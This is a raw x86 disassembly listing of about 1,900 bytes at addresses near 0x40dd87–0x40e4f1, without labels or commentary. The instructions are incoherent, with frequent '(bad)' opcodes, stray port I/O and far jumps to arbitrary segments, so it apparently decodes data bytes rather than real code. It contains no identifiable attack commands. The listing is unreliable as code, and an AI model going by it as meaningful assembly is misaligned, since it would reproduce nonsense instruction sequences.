  40dd87:	gs inc edx
  40dd89:	mov    dh,0xb2
  40dd8b:	xor    DWORD PTR ds:0x72fb6f2c,eax
  40dd91:	adc    ah,BYTE PTR [ebp-0x207ab0ae]
  40dd97:	mov    ebp,0x7aba694c
  40dd9c:	in     al,0x39
  40dd9e:	xchg   esp,eax
  40dd9f:	jp     0x40dda0
  40dda1:	icebp  
  40dda2:	dec    BYTE PTR [edx]
  40dda4:	and    dl,bh
  40dda6:	xchg   edi,eax
  40dda7:	sub    edi,DWORD PTR [edi+0x23]
  40ddaa:	and    cl,BYTE PTR [ebp+0x2c56b8b5]
  40ddb0:	push   edx
  40ddb1:	inc    ebp
  40ddb2:	enter  0xf2af,0xda
  40ddb6:	dec    edi
  40ddb7:	das    
  40ddb8:	mov    bh,0xbe
  40ddba:	inc    esi
  40ddbb:	lock jl 0x40dde4
  40ddbe:	imul   esi,DWORD PTR [ebx+0x4599ead7],0xffffffa4
  40ddc5:	jp     0x40dd7b
  40ddc7:	out    0xc,al
  40ddc9:	loop   0x40dd7f
  40ddcb:	sbb    edx,DWORD PTR ds:0x5ded6ec4
  40ddd1:	inc    esi
  40ddd2:	out    dx,al
  40ddd3:	adc    bl,bl
  40ddd5:	arpl   WORD PTR [ecx+0x3a61d9c7],di
  40dddb:	dec    ebx
  40dddc:	mov    edx,0x7976fef4
  40dde1:	push   0xffffff99
  40dde3:	xchg   edx,eax
  40dde4:	push   cs
  40dde5:	call   DWORD PTR [ebp-0x6a]
  40dde8:	lods   eax,DWORD PTR ds:[esi]
  40dde9:	inc    ebp
  40ddea:	mul    esi
  40ddec:	pusha  
  40dded:	out    0x3,al
  40ddef:	retf   
  40ddf0:	bound  esp,QWORD PTR [edx+eax*8+0x438825c4]
  40ddf7:	imul   BYTE PTR [esi]
  40ddf9:	mov    ebx,0x1a47150a
  40ddfe:	sbb    ebx,eax
  40de00:	push   ebp
  40de01:	and    bh,BYTE PTR ds:0xe13949c6
  40de07:	xchg   esi,eax
  40de08:	mov    dl,0x63
  40de0a:	es mov ecx,0x996d9bcf
  40de10:	pop    edi
  40de11:	retf   0xf5
  40de14:	daa    
  40de15:	fcmovu st,st(3)
  40de17:	sbb    eax,0x3a9a5aa7
  40de1c:	mov    DWORD PTR [eax+ecx*8+0x16b00390],edi
  40de23:	loopne 0x40ddb2
  40de25:	les    esp,FWORD PTR [eax+eiz*8+0x1]
  40de29:	jae    0x40de7d
  40de2b:	push   ebx
  40de2c:	dec    ebp
  40de2d:	pop    es
  40de2e:	stos   BYTE PTR es:[edi],al
  40de2f:	xchg   esi,eax
  40de30:	pop    ebp
  40de31:	outs   dx,BYTE PTR ds:[esi]
  40de32:	ja     0x40de03
  40de34:	pop    eax
  40de35:	jb     0xc7144546
  40de3b:	push   es
  40de3c:	shr    DWORD PTR [ebp+0x356a414a],cl
  40de42:	dec    ebp
  40de43:	daa    
  40de44:	(bad)  [ecx+0x2bcce297]
  40de4a:	dec    ecx
  40de4b:	pushf  
  40de4c:	lea    esp,[ebp-0x68ce1af4]
  40de52:	call   FWORD PTR [ebx]
  40de54:	call   0x49e6:0x664eae1c
  40de5b:	add    eax,0x23d9df14
  40de60:	xchg   ecx,eax
  40de61:	fincstp 
  40de63:	sub    cl,BYTE PTR [edi-0x34]
  40de66:	mov    ds:0xa7682207,eax
  40de6b:	jns    0x40ddf5
  40de6d:	out    0xbd,al
  40de6f:	inc    eax
  40de70:	jmp    0x62b8:0x3a812e68
  40de77:	aas    
  40de78:	sbb    esi,DWORD PTR [eax-0x2821910e]
  40de7e:	fwait
  40de7f:	jl     0x40de77
  40de81:	mov    DWORD PTR [ebx+0x6d9447d2],0x69882cce
  40de8b:	mov    eax,0xb5e92eed
  40de90:	lds    ebx,FWORD PTR [esi-0x781d3241]
  40de96:	dec    edi
  40de97:	push   0x27
  40de99:	mov    al,0x29
  40de9b:	sbb    eax,0xf32c3743
  40dea0:	rcr    DWORD PTR [ebx],cl
  40dea2:	or     dl,cl
  40dea4:	mov    ebp,0xb6f746c3
  40dea9:	stc    
  40deaa:	pop    edx
  40deab:	repnz call 0x5b2e:0x995e1e71
  40deb3:	mov    ebp,0xedb35029
  40deb8:	add    BYTE PTR [edi+0x3f],bh
  40debb:	ret    0x268c
  40debe:	daa    
  40debf:	pop    DWORD PTR [eax-0x5e]
  40dec2:	loopne 0x40de83
  40dec4:	jae    0x40de67
  40dec6:	into   
  40dec7:	dec    esi
  40dec8:	push   0xde27fa15
  40decd:	(bad)  
  40dece:	push   esi
  40decf:	xchg   edx,eax
  40ded0:	sbb    al,0x73
  40ded2:	jecxz  0x40de9f
  40ded4:	sbb    eax,DWORD PTR [ebp+0x42]
  40ded7:	jae    0x40df2b
  40ded9:	inc    cl
  40dedb:	inc    ebp
  40dedc:	pop    esp
  40dedd:	or     ecx,ebx
  40dedf:	pop    ebx
  40dee0:	and    al,ah
  40dee2:	pop    es
  40dee3:	xchg   ebx,eax
  40dee4:	or     eax,0xa63ce4d7
  40dee9:	mov    cl,0x60
  40deeb:	sar    DWORD PTR [edx-0x10e6e249],cl
  40def1:	into   
  40def2:	lahf   
  40def3:	lods   eax,DWORD PTR ds:[esi]
  40def4:	retf   0xdd87
  40def7:	push   edi
  40def8:	scas   al,BYTE PTR es:[edi]
  40def9:	adc    ebp,DWORD PTR [eax]
  40defb:	ins    BYTE PTR es:[edi],dx
  40defc:	lods   eax,DWORD PTR ds:[esi]
  40defd:	jb     0x40df17
  40deff:	mov    al,ds:0xcb48dc4a
  40df04:	lods   al,BYTE PTR ds:[esi]
  40df05:	mov    BYTE PTR [ecx],bl
  40df07:	inc    edx
  40df08:	mov    ah,0x96
  40df0a:	xchg   ebp,eax
  40df0b:	loopne 0x40deac
  40df0d:	dec    eax
  40df0e:	jo     0x40df80
  40df10:	scas   al,BYTE PTR es:[edi]
  40df11:	jp     0x40deee
  40df13:	xor    eax,0x6070592d
  40df18:	xor    eax,ebp
  40df1a:	cdq    
  40df1b:	add    ch,BYTE PTR [esi+0x48]
  40df1e:	and    DWORD PTR [edx+esi*1],0xdc54113c
  40df25:	(bad)  
  40df26:	mov    gs,edi
  40df28:	sbb    cl,al
  40df2a:	mov    ah,0x72
  40df2c:	or     bh,BYTE PTR [edi-0x38]
  40df2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df30:	hlt    
  40df31:	data16 int 0xfc
  40df34:	clc    
  40df35:	pushf  
  40df36:	sub    bh,bh
  40df38:	jb     0x40ded4
  40df3a:	or     eax,0x84f3c161
  40df3f:	retf   0x783e
  40df42:	push   ebp
  40df43:	rcl    cl,cl
  40df45:	dec    edi
  40df46:	push   ss
  40df47:	cld    
  40df48:	xor    eax,DWORD PTR [eax+0x2e85c046]
  40df4e:	daa    
  40df4f:	mov    al,0xec
  40df51:	jle    0x40dedd
  40df53:	stc    
  40df54:	cli    
  40df55:	arpl   WORD PTR [esi*8+0x5aaf4b43],cx
  40df5c:	into   
  40df5d:	adc    BYTE PTR [edi],cl
  40df5f:	jns    0x40df3f
  40df61:	and    cl,BYTE PTR [ebp-0x3755aa97]
  40df67:	mov    edi,0x3aebdde3
  40df6c:	jmp    0xaba2:0x678d8c1
  40df73:	add    al,0x88
  40df75:	sub    edi,0x5dc90c90
  40df7b:	retf   
  40df7c:	sbb    al,0x42
  40df7e:	and    DWORD PTR [eax],ebx
  40df80:	sub    ecx,ebx
  40df82:	dec    edx
  40df83:	sbb    eax,0x933e6ffd
  40df88:	lods   eax,DWORD PTR ds:[esi]
  40df89:	jmp    0xfe05daeb
  40df8e:	pop    esp
  40df8f:	push   cs
  40df90:	lods   al,BYTE PTR ds:[esi]
  40df91:	out    dx,al
  40df92:	ins    DWORD PTR es:[edi],dx
  40df93:	jmp    0x40df1d
  40df95:	data16 stos BYTE PTR es:[edi],al
  40df97:	sbb    ebx,esi
  40df99:	into   
  40df9a:	int3   
  40df9b:	into   
  40df9c:	mov    bp,0xb53c
  40dfa0:	mov    ds:0xd9258fab,al
  40dfa5:	push   ecx
  40dfa6:	pop    esi
  40dfa7:	dec    esp
  40dfa8:	xchg   DWORD PTR [esi-0x291e5e8e],esp
  40dfae:	in     eax,0x49
  40dfb0:	xlat   BYTE PTR ds:[ebx]
  40dfb1:	fldcw  WORD PTR [ecx+0x64]
  40dfb4:	(bad)  
  40dfb5:	fiadd  WORD PTR [edi-0x65d50a6e]
  40dfbb:	push   esi
  40dfbc:	and    eax,0xd0f1a2bb
  40dfc1:	xchg   esi,eax
  40dfc2:	dec    edi
  40dfc3:	cmp    eax,0x78ff8347
  40dfc8:	or     BYTE PTR [eax-0x4e],ah
  40dfcb:	and    eax,DWORD PTR [ebp-0x19]
  40dfce:	call   0x4e6:0x373471c2
  40dfd5:	and    edx,DWORD PTR ds:0xa6ac7fec
  40dfdb:	xchg   edx,eax
  40dfdc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dfdd:	imul   esp,DWORD PTR [ebp+0x10],0x34
  40dfe1:	pop    ss
  40dfe2:	mov    DWORD PTR [eax-0x2eda073b],ecx
  40dfe8:	sbb    al,0x9e
  40dfea:	scas   eax,DWORD PTR es:[edi]
  40dfeb:	nop
  40dfec:	jle    0x40dfea
  40dfee:	repnz xchg edx,eax
  40dff0:	mov    esp,0x5b589255
  40dff5:	out    0xe5,eax
  40dff7:	fisub  DWORD PTR [eax-0x61]
  40dffa:	test   DWORD PTR [edx],0xf55ddb27
  40e000:	int3   
  40e001:	or     DWORD PTR [ecx],0xffffffbd
  40e004:	inc    ebp
  40e005:	ds dec esp
  40e007:	or     BYTE PTR [eax],0xd9
  40e00a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e00b:	sbb    al,0x33
  40e00d:	bound  ebx,QWORD PTR [edi-0x63]
  40e010:	pop    ss
  40e011:	push   0x89b59f50
  40e016:	mov    esi,0x86a3ca5f
  40e01b:	int    0xa
  40e01d:	push   cs
  40e01e:	inc    ecx
  40e01f:	int    0x2f
  40e021:	pusha  
  40e022:	js     0xe75a9849
  40e028:	nop
  40e029:	rcr    BYTE PTR [edi+0x5a],cl
  40e02c:	jno    0x40dff0
  40e02e:	es push 0xffffffa4
  40e031:	mov    ebp,0x254e4ca5
  40e036:	inc    edi
  40e037:	fdivr  DWORD PTR [ebx+0x46749f3a]
  40e03d:	jecxz  0x40dfdf
  40e03f:	xchg   BYTE PTR cs:[edx+0xc],al
  40e043:	lods   eax,DWORD PTR ds:[esi]
  40e044:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e045:	fwait
  40e046:	(bad)  
  40e047:	and    DWORD PTR [esi+0x1a],edi
  40e04a:	ins    BYTE PTR es:[edi],dx
  40e04b:	lds    ebx,FWORD PTR ds:0x6b1756dd
  40e051:	mov    ebp,0x4db9e17
  40e056:	popa   
  40e057:	cmp    bl,BYTE PTR [eax+0x1cbe89e6]
  40e05d:	ficom  WORD PTR [ecx-0x74]
  40e060:	loope  0x40e091
  40e062:	rep stos DWORD PTR es:[edi],eax
  40e064:	jae    0x40e01a
  40e066:	xlat   BYTE PTR ds:[ebx]
  40e067:	int    0x6e
  40e069:	sub    BYTE PTR [ecx],cl
  40e06b:	(bad)
  40e06f:	inc    esp
  40e070:	fisubr WORD PTR ds:0x324645a6
  40e076:	loope  0x40e0b3
  40e078:	xor    ch,dl
  40e07a:	pop    esi
  40e07b:	ret    
  40e07c:	push   0xe0af2e26
  40e081:	xchg   ecx,eax
  40e082:	test   DWORD PTR [edi-0x17],ebp
  40e085:	lods   eax,DWORD PTR ds:[esi]
  40e086:	clc    
  40e087:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e088:	push   0x48f734e7
  40e08d:	jbe    0x40e013
  40e08f:	sub    BYTE PTR [ebx],ah
  40e091:	mov    ah,0xc1
  40e093:	loope  0x40e033
  40e095:	out    0x2d,al
  40e097:	inc    esi
  40e098:	test   DWORD PTR [esi],ecx
  40e09a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e09b:	cmp    eax,0x7c3e175c
  40e0a0:	dec    ecx
  40e0a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e0a2:	sbb    al,0xb3
  40e0a4:	xor    DWORD PTR [ebp+0x1b821386],0x76
  40e0ab:	call   0xc200:0x3d74fef4
  40e0b2:	fs mov ebp,0xa88fe77a
  40e0b8:	jb     0x40e0ee
  40e0ba:	pop    ebx
  40e0bb:	pop    eax
  40e0bc:	ins    BYTE PTR es:[edi],dx
  40e0bd:	mov    BYTE PTR [eax],ah
  40e0bf:	xchg   edx,eax
  40e0c0:	gs sbb eax,0x4c69740b
  40e0c6:	stos   DWORD PTR es:[edi],eax
  40e0c7:	push   cs
  40e0c8:	jle    0x40e11c
  40e0ca:	sti    
  40e0cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e0cc:	hlt    
  40e0cd:	push   eax
  40e0ce:	add    eax,0x69416a29
  40e0d3:	jmp    0x40e122
  40e0d5:	scas   eax,DWORD PTR es:[edi]
  40e0d6:	fbstp  TBYTE PTR [ecx]
  40e0d8:	std    
  40e0d9:	add    dh,BYTE PTR [esi-0x13]
  40e0dc:	stos   DWORD PTR es:[edi],eax
  40e0dd:	push   esp
  40e0de:	outs   dx,BYTE PTR ds:[esi]
  40e0df:	int3   
  40e0e0:	bound  eax,QWORD PTR [edx-0x15]
  40e0e3:	and    eax,0xce7c09f2
  40e0e8:	into   
  40e0e9:	(bad)  
  40e0ea:	mov    esi,0x2beb93cb
  40e0ef:	shl    BYTE PTR [ebx+0x1d731a55],0xa3
  40e0f6:	pop    esi
  40e0f7:	div    DWORD PTR [ecx]
  40e0f9:	jmp    0x40e092
  40e0fb:	inc    ecx
  40e0fc:	daa    
  40e0fd:	xcrypt-ofb (bad)
  40e0fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e0ff:	sub    BYTE PTR [edi+edx*1],ch
  40e102:	aas    
  40e103:	imul   ebx,DWORD PTR [edx],0x84765744
  40e109:	stos   BYTE PTR es:[edi],al
  40e10a:	sub    DWORD PTR [edx],0xfa683acb
  40e110:	jb     0x40e168
  40e112:	dec    esp
  40e113:	xchg   DWORD PTR [ebx],edi
  40e115:	loopne 0x40e196
  40e117:	mov    al,ds:0xe002ceac
  40e11c:	cli    
  40e11d:	xchg   esp,eax
  40e11e:	cmp    eax,esp
  40e120:	pop    esi
  40e121:	adc    DWORD PTR [ebx],edi
  40e123:	cmovge ebx,ebp
  40e126:	(bad)  
  40e127:	in     eax,dx
  40e128:	fiadd  DWORD PTR [esi-0x61f17ee7]
  40e12e:	les    ecx,FWORD PTR [edi]
  40e130:	fucomp st(5)
  40e132:	cmp    ebp,edi
  40e134:	sub    dl,cl
  40e136:	js     0x40e11e
  40e138:	js     0x40e0ca
  40e13a:	imul   ecx,ebp,0x5b898c4b
  40e140:	jo     0x40e118
  40e142:	sbb    dh,bh
  40e144:	cwde   
  40e145:	jns    0x40e171
  40e147:	fadd   QWORD PTR [eax+0x3bc9908]
  40e14d:	push   ebp
  40e14e:	push   ss
  40e14f:	out    dx,eax
  40e150:	and    eax,0xe239e422
  40e155:	cdq    
  40e156:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e157:	add    al,0xb4
  40e159:	in     al,dx
  40e15a:	in     al,dx
  40e15b:	fs loopne 0x40e19e
  40e15e:	ret    0x3d90
  40e161:	mov    al,ds:0x6f765096
  40e166:	inc    edx
  40e167:	and    ebp,DWORD PTR [esi-0x1b]
  40e16a:	xchg   ebp,eax
  40e16b:	jl     0x40e15a
  40e16d:	mov    edi,0x9c999049
  40e172:	mov    dl,0x7a
  40e174:	js     0x40e190
  40e176:	xchg   ecx,eax
  40e177:	mov    esi,0xabe1cc0d
  40e17c:	sti    
  40e17d:	push   cs
  40e17e:	sbb    al,0x70
  40e180:	or     esi,DWORD PTR [edi-0x4]
  40e183:	cmp    eax,0xe6de3aea
  40e188:	add    al,BYTE PTR [esi]
  40e18a:	and    DWORD PTR [esi],esp
  40e18c:	cmp    DWORD PTR [eax],ebx
  40e18e:	out    0xe7,al
  40e190:	sti    
  40e191:	(bad)  
  40e192:	aam    0x89
  40e194:	or     DWORD PTR [ecx-0x5],eax
  40e197:	and    ax,0xdcc2
  40e19b:	and    eax,0x894b5578
  40e1a0:	mov    bl,0x39
  40e1a2:	das    
  40e1a3:	adc    BYTE PTR [esi-0x1872c274],cl
  40e1a9:	adc    DWORD PTR [si],ebx
  40e1ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e1ad:	mov    edx,0x669474ef
  40e1b2:	add    BYTE PTR [ebp-0x59],dl
  40e1b5:	adc    eax,0xdcc61ecb
  40e1ba:	outs   dx,BYTE PTR ds:[esi]
  40e1bb:	xchg   bl,dh
  40e1bd:	cld    
  40e1be:	adc    bh,BYTE PTR [esi]
  40e1c0:	sbb    eax,0xa22eec0f
  40e1c5:	iret   
  40e1c6:	aad    0x5d
  40e1c8:	xchg   ebp,eax
  40e1c9:	les    esi,FWORD PTR [ebp+ebx*2-0x10]
  40e1cd:	mov    BYTE PTR [ebp+0x44981c7a],bl
  40e1d3:	sar    BYTE PTR [ebp-0x24605b51],1
  40e1d9:	ror    BYTE PTR [edx-0x751597dc],0x55
  40e1e0:	rcr    BYTE PTR [ebp-0x71],cl
  40e1e3:	xchg   edi,eax
  40e1e4:	adc    DWORD PTR [esi-0x28],0x4e6c8e9b
  40e1eb:	dec    eax
  40e1ec:	pop    es
  40e1ed:	mov    ds:0x2e8ae7a2,al
  40e1f2:	aam    0x5b
  40e1f4:	lods   al,BYTE PTR ds:[esi]
  40e1f5:	inc    edi
  40e1f6:	jbe    0x40e23a
  40e1f8:	stos   BYTE PTR es:[edi],al
  40e1f9:	cmp    eax,0xc6445dac
  40e1fe:	add    eax,0x76d620ef
  40e203:	std    
  40e204:	loop   0x40e1f3
  40e206:	loope  0x40e1fb
  40e208:	add    eax,0xf52fa0c6
  40e20d:	xchg   esp,eax
  40e20e:	outs   dx,BYTE PTR ds:[esi]
  40e20f:	jo     0x40e1ea
  40e211:	int3   
  40e212:	jne    0x40e1ab
  40e214:	cwde   
  40e215:	test   al,0x80
  40e217:	leave  
  40e218:	cmp    eax,0x87d52855
  40e21d:	xor    ebx,DWORD PTR [edi+0x63bcb53b]
  40e223:	stos   DWORD PTR es:[edi],eax
  40e224:	inc    edi
  40e225:	js     0x40e1b1
  40e227:	sbb    bh,ah
  40e229:	fsubr  QWORD PTR [ecx+0x61]
  40e22c:	je     0x40e252
  40e22e:	sub    eax,DWORD PTR [ebx-0x15]
  40e231:	iret   
  40e232:	fs (bad) 
  40e234:	pusha  
  40e235:	int    0x67
  40e237:	pop    edx
  40e238:	mov    es,ebx
  40e23a:	(bad)  
  40e23b:	data16 dec BYTE PTR [ebx+0x33]
  40e23f:	cli    
  40e240:	inc    ebx
  40e241:	fwait
  40e242:	inc    ecx
  40e243:	dec    eax
  40e244:	xchg   ecx,eax
  40e245:	mov    edx,0x61bb89e1
  40e24a:	lds    ebx,FWORD PTR [esi-0x53]
  40e24d:	(bad)  
  40e24e:	mov    edx,0x70025548
  40e253:	outs   dx,BYTE PTR ds:[esi]
  40e254:	cmp    al,0x71
  40e256:	int3   
  40e257:	jo     0x40e227
  40e259:	je     0x40e2b5
  40e25b:	dec    esp
  40e25c:	xor    DWORD PTR [esi+edi*2],eax
  40e25f:	inc    esp
  40e260:	xor    DWORD PTR [edx-0x35],0xffffffba
  40e264:	or     ebp,edx
  40e266:	icebp  
  40e267:	cmp    al,0xb8
  40e269:	sbb    ebp,DWORD PTR [edx-0x3f1ff471]
  40e26f:	mov    ch,0x47
  40e271:	inc    edi
  40e272:	popfw  
  40e274:	ds in  eax,dx
  40e276:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e277:	cld    
  40e278:	sub    al,0x64
  40e27a:	shl    BYTE PTR [ebp-0x224cfa38],0x54
  40e281:	mov    ebx,esi
  40e283:	xchg   ebx,eax
  40e284:	test   BYTE PTR [ebx-0x492ae1ce],bh
  40e28a:	cmp    bp,WORD PTR [eax]
  40e28d:	enter  0x4fa4,0x15
  40e291:	loope  0x40e30e
  40e293:	lahf   
  40e294:	das    
  40e295:	jno    0x40e245
  40e297:	xchg   edx,eax
  40e298:	leave  
  40e299:	shr    edx,1
  40e29b:	cld    
  40e29c:	add    al,0x7e
  40e29e:	inc    ebp
  40e29f:	fidivr WORD PTR [edx-0x1]
  40e2a2:	aaa    
  40e2a3:	cli    
  40e2a4:	fnstenv [ebp+0x4f6fef86]
  40e2aa:	mov    bl,BYTE PTR [edi+eax*4]
  40e2ad:	pop    eax
  40e2ae:	fcomp  QWORD PTR [edx+eiz*2]
  40e2b1:	idiv   dh
  40e2b3:	lock adc DWORD PTR [ebp-0x3e],edx
  40e2b7:	mov    DWORD PTR [eax+0xae4f305],0xfcafdaef
  40e2c1:	push   edi
  40e2c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e2c3:	sub    dl,BYTE PTR [edi]
  40e2c5:	sti    
  40e2c6:	mov    edi,0x139e83cc
  40e2cb:	call   0x75810033
  40e2d0:	ss xchg esi,eax
  40e2d2:	adc    eax,0x38b0c7c5
  40e2d7:	mov    DWORD PTR [eax+ebx*2],esi
  40e2da:	mov    ss,WORD PTR [edx-0x60]
  40e2dd:	fmul   DWORD PTR [ebp-0x69]
  40e2e0:	loop   0x40e358
  40e2e2:	or     eax,ebp
  40e2e4:	lds    esp,FWORD PTR fs:[eax-0x5]
  40e2e8:	jb     0x40e364
  40e2ea:	cwde   
  40e2eb:	into   
  40e2ec:	xchg   edi,eax
  40e2ed:	jae    0x40e2c0
  40e2ef:	ds ss dec esi
  40e2f2:	jno    0x40e2e3
  40e2f4:	lods   al,BYTE PTR ds:[esi]
  40e2f5:	sub    bh,ah
  40e2f7:	retf   0x2e10
  40e2fa:	out    0xae,eax
  40e2fc:	pop    edi
  40e2fd:	ins    DWORD PTR es:[edi],dx
  40e2fe:	push   esp
  40e2ff:	mov    bl,0x17
  40e301:	push   ebx
  40e302:	popf   
  40e303:	add    DWORD PTR [edx+0x42],esp
  40e306:	not    bh
  40e308:	push   eax
  40e309:	pop    ss
  40e30a:	(bad)  
  40e30b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e30c:	add    bh,BYTE PTR [esp+ebp*4+0x64]
  40e310:	pop    ebp
  40e311:	push   es
  40e312:	out    dx,eax
  40e313:	aaa    
  40e314:	push   eax
  40e315:	scas   al,BYTE PTR es:[edi]
  40e316:	aas    
  40e317:	inc    ebx
  40e318:	fisttp QWORD PTR es:[ecx-0x4e69b597]
  40e31f:	aad    0xff
  40e321:	data16 out dx,al
  40e323:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e324:	and    BYTE PTR [ecx+eax*1+0x6783c9e2],bh
  40e32b:	stc    
  40e32c:	push   ss
  40e32d:	repnz loope 0x40e2fe
  40e330:	push   esi
  40e331:	adc    edi,DWORD PTR [edi+0x244df625]
  40e337:	or     al,0x7b
  40e339:	push   ecx
  40e33a:	out    0x60,al
  40e33c:	ret    0xb9ba
  40e33f:	or     DWORD PTR [ebx],0x7e
  40e342:	ret    
  40e343:	sub    BYTE PTR ds:0x23e5ef69,dl
  40e349:	push   edi
  40e34a:	rcr    ecx,cl
  40e34c:	mov    eax,DWORD PTR [ecx+edi*1]
  40e34f:	push   edi
  40e350:	jmp    0xe0e4f894
  40e355:	push   ecx
  40e356:	cs xchg bl,dh
  40e359:	daa    
  40e35a:	sub    al,0xad
  40e35c:	jmp    0x85b2:0x2f0857c6
  40e363:	push   ebx
  40e364:	push   edi
  40e365:	sbb    esp,DWORD PTR [esi+ebx*4+0x28]
  40e369:	mov    dl,0x70
  40e36b:	int3   
  40e36c:	retf   0xde3a
  40e36f:	js     0x40e3b6
  40e371:	xor    DWORD PTR [edi],edi
  40e373:	jb     0x40e39c
  40e375:	push   esp
  40e376:	aas    
  40e377:	add    al,0x9b
  40e379:	retf   
  40e37a:	mov    ebx,0xae27d425
  40e37f:	xor    al,0xbe
  40e381:	push   0x1ebb75c2
  40e386:	mov    cl,0x3a
  40e388:	dec    esp
  40e389:	(bad)
  40e38d:	jno    0x40e3be
  40e38f:	sbb    ebx,edi
  40e391:	sub    esp,eax
  40e393:	out    0x4d,eax
  40e395:	fs mov cl,0xb5
  40e398:	mov    bl,0x76
  40e39a:	ret    0x5dbc
  40e39d:	hlt    
  40e39e:	pop    esi
  40e39f:	(bad)
  40e3a2:	mov    al,0xb1
  40e3a4:	pop    ss
  40e3a5:	cmp    esi,DWORD PTR [ecx]
  40e3a7:	adc    BYTE PTR [ecx],al
  40e3a9:	loope  0x40e3a4
  40e3ab:	lds    si,DWORD PTR [ebx]
  40e3ae:	or     DWORD PTR [ebp-0x2ea1ab42],ebp
  40e3b4:	test   DWORD PTR [edx-0x52],ebx
  40e3b7:	and    DWORD PTR [ebx+edx*2-0x5a],edx
  40e3bb:	sbb    BYTE PTR [edx+0x66],dh
  40e3be:	mov    edx,0x27b64bcc
  40e3c3:	sbb    DWORD PTR [ecx],esi
  40e3c5:	ja     0x40e34d
  40e3c7:	mov    DWORD PTR [ecx+0x79],ebp
  40e3ca:	mov    al,ds:0x1cd97ab7
  40e3cf:	push   edi
  40e3d0:	das    
  40e3d1:	push   ecx
  40e3d2:	test   bh,cl
  40e3d4:	mov    ebp,0x5f45d1e7
  40e3d9:	mov    ecx,0x6e5c78ea
  40e3de:	adc    eax,0x5e80dfb3
  40e3e3:	neg    BYTE PTR [ebx+0x62]
  40e3e6:	jnp    0x40e3ea
  40e3e8:	ds mov al,0x6b
  40e3eb:	clc    
  40e3ec:	pop    ecx
  40e3ed:	push   esp
  40e3ee:	pushf  
  40e3ef:	test   DWORD PTR [esi-0x287a950],0xdc67dc55
  40e3f9:	add    DWORD PTR [ebx+0xd],esi
  40e3fc:	xchg   ebp,eax
  40e3fd:	push   esi
  40e3fe:	rol    BYTE PTR [ebx+0x74067fc7],0xe7
  40e405:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e406:	push   es
  40e407:	shl    BYTE PTR [esi+0x74],1
  40e40a:	retf   
  40e40b:	jo     0x40e447
  40e40d:	daa    
  40e40e:	sbb    ah,BYTE PTR [edx]
  40e410:	push   edi
  40e411:	mov    esp,0xec1a2311
  40e416:	mov    ebp,0x3c81b705
  40e41b:	xor    ebx,DWORD PTR [eax]
  40e41d:	jecxz  0x40e3ed
  40e41f:	js     0x40e41a
  40e421:	sbb    DWORD PTR [ebx+0x25c5e7b9],0x97b9d632
  40e42b:	inc    ecx
  40e42c:	fisubr DWORD PTR [ecx-0x4c75a7ae]
  40e432:	mov    cl,0xd5
  40e434:	aam    0x36
  40e436:	sbb    ch,bl
  40e438:	sub    dl,BYTE PTR [ecx-0x5b]
  40e43b:	das    
  40e43c:	push   esi
  40e43d:	mov    dh,0x9d
  40e43f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e440:	ds pop ebp
  40e442:	xchg   ecx,esi
  40e444:	call   FWORD PTR ds:0x34894822
  40e44a:	xor    ecx,DWORD PTR [ecx-0x7e]
  40e44d:	clc    
  40e44e:	inc    edx
  40e44f:	cs bswap edi
  40e452:	jb     0x40e4c1
  40e454:	ret    0xce1f
  40e457:	popa   
  40e458:	mov    al,0x11
  40e45a:	repnz mov dh,BYTE PTR [eax+ebp*8-0x2c]
  40e45f:	xchg   ecx,eax
  40e460:	sar    DWORD PTR [di],0x6c
  40e464:	and    eax,0x538687a4
  40e469:	enter  0xe5d3,0x7c
  40e46d:	mov    bl,0x45
  40e46f:	out    0x7e,eax
  40e471:	cli    
  40e472:	(bad)  
  40e474:	mov    al,0x9
  40e476:	xchg   esi,eax
  40e477:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e478:	clc    
  40e479:	stc    
  40e47a:	fs lock cmp al,0xb0
  40e47e:	addr16 (bad) 
  40e480:	mov    BYTE PTR [edx-0x221ffdba],0x60
  40e487:	mov    ebp,0x96856977
  40e48c:	and    ch,ch
  40e48e:	dec    ebx
  40e48f:	repz jl 0x40e444
  40e492:	mov    ah,0x98
  40e494:	cmp    al,0x71
  40e496:	mov    al,dl
  40e498:	mov    al,ds:0x553d2c72
  40e49d:	sbb    BYTE PTR [edi],al
  40e49f:	mov    eax,ds:0x9840e47a
  40e4a5:	std    
  40e4a6:	aaa    
  40e4a7:	fidiv  WORD PTR [ecx+eax*2+0x2b]
  40e4ab:	into   
  40e4ac:	add    BYTE PTR [edi+0x47],cl
  40e4af:	push   es
  40e4b0:	mov    DWORD PTR ds:0x3afe16f,edi
  40e4b6:	or     BYTE PTR [ebp+0x2],0x8e
  40e4ba:	sbb    edx,DWORD PTR [edi+0x69]
  40e4bd:	and    ah,BYTE PTR [edx-0x54]
  40e4c0:	pop    es
  40e4c1:	mov    cl,0xb0
  40e4c3:	or     eax,0x31085d27
  40e4c8:	or     DWORD PTR [ebp+0x2eee8c4d],0xafc0eb9b
  40e4d2:	inc    eax
  40e4d3:	aam    0xd1
  40e4d5:	dec    ebp
  40e4d6:	fwait
  40e4d7:	add    eax,0x54575bf8
  40e4dc:	sar    DWORD PTR [ebx+0x63e256e6],1
  40e4e2:	mov    ?,WORD PTR [ecx]
  40e4e4:	mov    DWORD PTR [esi-0x57],edx
  40e4e7:	jg     0x40e4ba
  40e4e9:	in     al,dx
  40e4ea:	cmc    
  40e4eb:	aam    0x55
  40e4ed:	ins    BYTE PTR es:[edi],dx
  40e4ee:	mov    dl,0xf
  40e4f0:	pop    eax
  40e4f1:	sub    eax,eax
